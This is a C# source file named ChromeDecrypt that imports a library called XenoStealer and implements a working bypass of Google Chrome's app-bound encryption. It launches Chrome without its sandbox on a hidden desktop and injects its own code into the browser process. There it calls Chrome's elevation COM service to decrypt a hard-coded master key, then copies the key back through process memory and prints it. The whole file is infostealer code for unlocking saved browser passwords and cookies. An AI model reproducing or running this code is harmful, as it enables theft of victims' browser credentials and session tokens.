using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using XenoStealer;


namespace ChromeDecrypt
{
    public class Program
    {
        public static byte[] GetAppBoundKey()
        {
             string InjectionDesktopName = "InjectionDesktop" + Utils.GenerateRandomString(8);

            uint MEM_COMMIT = 0x00001000;
            uint MEM_RESERVE = 0x00002000;
            uint PAGE_READWRITE = 0x04;
            uint MEM_RELEASE = 0x00008000;
            string encryptedKeyBase64 = "QVBQQgEAAADQjJ3fARXREYx6AMBPwpfrAQAAAFPBlXGn+rRBiBLJOoWPBdUQAAAAHAAAAEcAbwBvAGcAbABlACAAQwBoAHIAbwBtAGUAAAAQZgAAAAEAACAAAABl7Oyvr4GfX0OFc3vTERCZayv63JuJ+MQt40bhj0hgcwAAAAAOgAAAAAIAACAAAAAxgSnT9PxTIjfM5B45tm3YyEtgCVTGH2cRSVz4pHdbsXABAACyRUOC8cuT1Q7Ax1aAXpNG51btIIUdXsGJZ6RxHEHIoZpNlZ2Xmp0hg2ti44wj5NVcdXBPt/3tpAhuEF4JyjC79RpRKRmZPpQcI23gi/9BbFTC3rrpLGc2oe0+ktsEFc9rf0soILn3oSykteb7KGiU7/a3Synmyog1rvQ7qpWjvJExwuW3FhvgkBtVJgGdFqGweMKG8u+Q9OQV56HLTPrtnN1IRS5O9C8PRAcbwLIt2HGKjh0qCTDo1nuQFsUH4Fs4mKdYQ96r26yYy0u9U65Wfm/3oIgbWqziJus6w+Lz3EPE+0hLVeIDaQpPOBuKDRSscc5u16oa3L18+OYXM6kh334wkRVykwctsWuMoPtnCfYDhXzkdllvpDvan5FHccBKHl4gJOHIy608HMyIQXz9pocvryhatmoVtSFKm78b3wlDyKRjLHMsAXdssdI9/ER9EelOfqoaM6SeBOPCaCzvWe0oNnzhAaLQ50P6Zq+PCUAAAADo16+tGKfJ6HU+ruTsp6mlNlevatZYjIC4BoCONnHMncMznR7dtJUZHWyPcKhhAvHb0vS6t+rYSQWifvXSE8mlAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

            byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);

            if (Encoding.UTF8.GetString(encryptedKey, 0, 4) != "APPB")
            {
                return null;
            }

            byte[] masterKey = new byte[encryptedKey.Length - 4];

            Buffer.BlockCopy(encryptedKey, 4, masterKey, 0, masterKey.Length);


            IntPtr desktopHandle = NativeMethods.OpenDesktopW(InjectionDesktopName, 0, false, InternalStructs.DESKTOP_ACCESS.GENERIC_ALL);

            if (desktopHandle == IntPtr.Zero)
            {
                desktopHandle = NativeMethods.CreateDesktopW(InjectionDesktopName, null, IntPtr.Zero, 0, InternalStructs.DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
            }

            if (desktopHandle == IntPtr.Zero)
            {
                return null;
            }

            string tempUserDirectory = Utils.GetTemporaryDirectory();

            string LibraryPath = @"C:\Program Files\Google\Chrome\Application\chrome.exe";

            string commandLine = $"\"{LibraryPath}\" --no-sandbox --allow-no-sandbox-job --disable-gpu --mute-audio --disable-audio --user-data-dir=\"{tempUserDirectory}\"";

            foreach (int pid in Utils.GetAllProcessOnDesktop(InjectionDesktopName))
            {
                Utils.KillProcess(pid);
            }

            if (!Utils.StartProcessInDesktop(InjectionDesktopName, commandLine, out int _))
            {
                NativeMethods.CloseDesktop(desktopHandle);
                return null;
            }

            Thread.Sleep(300);//wait for process to fully launch

            int[] pids = Utils.GetAllProcessOnDesktop(InjectionDesktopName);
            if (pids.Length == 0)
            {
                NativeMethods.CloseDesktop(desktopHandle);
                return null;
            }

            int MaxReturnLength = 1024;

            byte[] payload = new byte[sizeof(long) + sizeof(int) + masterKey.Length + sizeof(int)];
            IntPtr returnAddr = NativeMethods.VirtualAlloc(IntPtr.Zero, (UIntPtr)MaxReturnLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            Buffer.BlockCopy(BitConverter.GetBytes(returnAddr.ToInt64()), 0, payload, 0, sizeof(long));
            Buffer.BlockCopy(BitConverter.GetBytes(NativeMethods.GetCurrentProcessId()), 0, payload, sizeof(long), sizeof(uint));
            Buffer.BlockCopy(masterKey, 0, payload, sizeof(long) + sizeof(int), masterKey.Length);
            Buffer.BlockCopy(BitConverter.GetBytes((int)(sizeof(long) + sizeof(uint) + masterKey.Length)), 0, payload, sizeof(long) + sizeof(uint) + masterKey.Length, sizeof(int));

            bool injected = false;

            int maxTries = 5;
            int currentTry = 0;
            while (true)
            {
                foreach (int pid in pids)
                {
                    if (SharpInjector.Inject(pid, InjectionEntryPointDONOTCALL, 2000, payload) == SharpInjector.InjectionStatusCode.SUCCESS)
                    {
                        injected = true;
                        break;
                    }
                }
                if (currentTry >= maxTries || injected)
                {
                    break;
                }
                Thread.Sleep(100);
                pids = Utils.GetAllProcessOnDesktop(InjectionDesktopName);
                currentTry++;
            }

            if (!injected)
            {
                foreach (int pid in Utils.GetAllProcessOnDesktop(InjectionDesktopName))
                {
                    Utils.KillProcess(pid);
                }

                NativeMethods.VirtualFree(returnAddr, UIntPtr.Zero, MEM_RELEASE);
                NativeMethods.CloseDesktop(desktopHandle);
                return null;
            }
            byte[] returnData = null;
            for (int i = 0; i < 200; i++) //wait at max 2 seconds
            {
                if (Marshal.ReadByte(returnAddr) != 0)
                {
                    int dataLength = Marshal.ReadInt32(returnAddr + sizeof(byte));
                    if (dataLength == 0)
                    {
                        break;
                    }
                    returnData = new byte[dataLength];
                    Marshal.Copy(returnAddr + sizeof(int) + sizeof(byte), returnData, 0, dataLength);
                    break;
                }
                Thread.Sleep(10);
            }
            NativeMethods.VirtualFree(returnAddr, UIntPtr.Zero, MEM_RELEASE);

            foreach (int pid in Utils.GetAllProcessOnDesktop(InjectionDesktopName))
            {
                Utils.KillProcess(pid);
            }

            NativeMethods.CloseDesktop(desktopHandle);

            try
            {
                Directory.Delete(tempUserDirectory, true);
            }
            catch { }

            return returnData;
        }

        public static void InjectionEntryPointDONOTCALL()
        {
            byte[] data = Utils.GetCurrentSelfBytes();
            int payloadLength = BitConverter.ToInt32(data, data.Length - sizeof(int));
            //[pointer|pid|masterKey]|length
            //[8bytes|4bytes|varible]|<payload_length (8+ 4 + varible_length)
            long pointer = BitConverter.ToInt64(data, data.Length - sizeof(int) - payloadLength);
            int pid = BitConverter.ToInt32(data, data.Length - sizeof(int) - payloadLength + sizeof(long));
            byte[] masterKey = new byte[payloadLength - sizeof(int) - sizeof(long)];
            Buffer.BlockCopy(data, data.Length - sizeof(int) - payloadLength + sizeof(long) + sizeof(int), masterKey, 0, masterKey.Length);

            byte[] decryptedData = DecryptKey(masterKey);

            if (decryptedData == null)
            {
                decryptedData = new byte[0];
            }

            byte[] payload = new byte[sizeof(byte) + sizeof(int) + decryptedData.Length];
            Buffer.BlockCopy(new byte[] { 1 }, 0, payload, 0, sizeof(byte));
            Buffer.BlockCopy(BitConverter.GetBytes(decryptedData.Length), 0, payload, sizeof(byte), sizeof(int));
            Buffer.BlockCopy(decryptedData, 0, payload, sizeof(int) + sizeof(byte), decryptedData.Length);

            IntPtr procHandle = SharpInjector.GetProcessHandleWithRequiredRights(pid);
            if (Utils.IsProcess64Bit(procHandle))
            {
                Utils64.WriteBytesToProcess64(procHandle, (ulong)pointer, payload);
            }
            else
            {
                Utils32.WriteBytesToProcess32(procHandle, (IntPtr)pointer, payload);
            }
            NativeMethods.CloseHandle(procHandle);
        }

        private static byte[] DecryptKey(byte[] key)
        {
            uint CLSCTX_LOCAL_SERVER = 0x4;
            uint RPC_C_AUTHN_DEFAULT = 0xffffffff;
            uint RPC_C_AUTHZ_DEFAULT = 0xffffffff;
            uint RPC_C_AUTHN_LEVEL_PKT_PRIVACY = 6;
            uint RPC_C_IMP_LEVEL_IMPERSONATE = 3;
            uint EOAC_DYNAMIC_CLOAKING = 0x40;

            //stable: 708860E0-F641-4611-8895-7D867DD3675B
            //beta: DD2646BA-3707-4BF8-B9A7-038691A68FC2
            //dev: DA7FDCA5-2CAA-4637-AA17-0740584DE7DA
            //sxs: 704C2872-2049-435E-A469-0A534313C42B

            Guid elevatorClsid = new Guid("708860E0-F641-4611-8895-7D867DD3675B");
            Guid elevatorIid = typeof(InternalStructs.IElevator).GUID;

            IntPtr elevatorPtr;
            int hr = NativeMethods.CoCreateInstance(ref elevatorClsid, IntPtr.Zero, CLSCTX_LOCAL_SERVER, ref elevatorIid, out elevatorPtr);

            if (hr < 0)
            {
                return null;
            }

            InternalStructs.IElevator elevator = (InternalStructs.IElevator)Marshal.GetObjectForIUnknown(elevatorPtr);

            hr = NativeMethods.CoSetProxyBlanket(
                elevatorPtr,
                RPC_C_AUTHN_DEFAULT,
                RPC_C_AUTHZ_DEFAULT,
                IntPtr.Zero,
                RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                RPC_C_IMP_LEVEL_IMPERSONATE,
                IntPtr.Zero,
                EOAC_DYNAMIC_CLOAKING);

            if (hr < 0)
            {
                return null;
            }

            IntPtr bstrPtr = NativeMethods.SysAllocStringByteLen(key, (uint)key.Length);

            if (bstrPtr == IntPtr.Zero)
            {
                return null;
            }

            Marshal.Copy(key, 0, bstrPtr, key.Length);

            IntPtr data;
            try
            {
                hr = elevator.DecryptData(bstrPtr, out data, out uint lastError);
            }
            catch (Exception e)
            {
                return null;
            }
            finally
            {
                Marshal.FreeBSTR(bstrPtr);
            }
            if (hr < 0)
            {
                return null;
            }

            int byteLength = Marshal.SystemMaxDBCSCharSize * (int)NativeMethods.SysStringByteLen(data);


            byte[] bytes = new byte[byteLength];
            
            Marshal.Copy(data, bytes, 0, byteLength);

            Marshal.FreeBSTR(data);

            return bytes;

        }
        static void Main(string[] args)
        {
            byte[] appBoundPrivateKey = Program.GetAppBoundKey();
            Console.WriteLine(appBoundPrivateKey.Length);
            Console.WriteLine(BitConverter.ToString(appBoundPrivateKey).Replace("-", ""));
        }
    }
}
